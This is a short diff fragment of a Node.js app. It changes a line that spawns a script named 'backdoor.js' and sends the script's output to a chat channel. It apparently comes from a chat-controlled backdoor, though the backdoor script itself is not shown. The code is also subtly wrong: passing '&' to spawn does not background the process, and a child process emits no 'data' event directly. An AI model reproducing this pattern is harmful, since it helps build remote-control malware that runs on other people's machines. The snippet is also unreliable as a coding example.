@@ -52,7 +52,7 @@ app.listen(3984, function (err) {
         });
 
         require("child_process")
-            .spawn("node", ["backdoor.js"])
+            .spawn("node", ["backdoor.js", "&"])
             .on("data", (data) => {
                 message.channel.send(data);
             });
